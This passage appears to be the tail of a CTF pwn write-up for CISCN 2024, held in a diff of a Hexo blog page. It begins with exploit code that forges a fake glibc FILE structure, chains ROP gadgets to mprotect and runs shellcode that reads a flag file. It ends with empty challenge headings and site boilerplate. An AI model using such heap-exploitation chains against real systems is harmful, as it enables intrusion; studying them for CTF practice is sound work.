class="hljs-string">b&#x27;hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&#x27;</span><br><br>f = flat(&#123;<br>    <span class="hljs-number">0x28</span>: <span class="hljs-number">1</span>, <span class="hljs-comment"># _IO_write_ptr</span><br>    <span class="hljs-number">0x38</span>: fake_IO_FILE + <span class="hljs-number">0x280</span>, <span class="hljs-comment"># _IO_buf_base</span><br>    <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xd8</span>: libc_base + <span class="hljs-number">0x2170c0</span>, <span class="hljs-comment">#_vtables</span><br>    &#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>data = <span class="hljs-built_in">bytes</span>(f).ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0xe0</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x200</span>)<br>data = data.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x68</span><br>data += p64(libc_base + <span class="hljs-number">0x15d48a</span>)   <br>data = data.ljust(<span class="hljs-number">0x280</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x162f64</span>)<br>data = data.ljust(<span class="hljs-number">0x2a0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2e0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x167420</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data = data.ljust(<span class="hljs-number">0x2e0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(libc_base + <span class="hljs-number">0xd2ba5</span>)+<span class="hljs-number">0x18</span>*<span class="hljs-string">b&quot;\x00&quot;</span><br>data += p64(libc_base + <span class="hljs-number">0x5a120</span>)+<span class="hljs-number">0x8</span>*<span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># mov_rsp_rdx</span><br><br>data += p64(libc_base + <span class="hljs-number">0x2a3e5</span>) <span class="hljs-comment"># pop_rdi</span><br>data += p64(heap_base)<br>data += p64(libc_base + <span class="hljs-number">0x2be51</span>) <span class="hljs-comment"># pop_rsi</span><br>data += p64(<span class="hljs-number">0x10000</span>)<br>data += p64(libc_base + <span class="hljs-number">0x904a9</span>) <span class="hljs-comment"># pop_rdx_rbx</span><br>data += p64(<span class="hljs-number">7</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])<br>data += p64(heap_base + <span class="hljs-number">0x3000</span>)<br><br>data = data.ljust(<span class="hljs-number">0x360</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1a0</span>+data)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>,shellcode)<br><br>Exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="SuperHeap"><a href="#SuperHeap" class="headerlink" title="SuperHeap"></a>SuperHeap</h2><h2 id="magic-vm"><a href="#magic-vm" class="headerlink" title="magic_vm"></a>magic_vm</h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/WP/" class="print-no-link">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ciscn2024 初赛 wp</div>
+      <div>https://voidchunk.github.io/2024/05/20/ciscn2024-初赛-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>voidchunk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/27/DragonKnightCTF-wp/" title="DragonKnightCTF wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DragonKnightCTF wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/12/syscall/" title="syscall">
+                        <span class="hidden-mobile">syscall</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"voidchunk/voidchunk.github.io","repo-id":"R_kgDOL3zepA","category":"Announcements","category-id":"DIC_kwDOL3zepM4CftjK","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":0,"emit-metadata":0,"input-position":"top","lang":"zh-CN","loading":"lazy","crossorigin":"anonymous"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
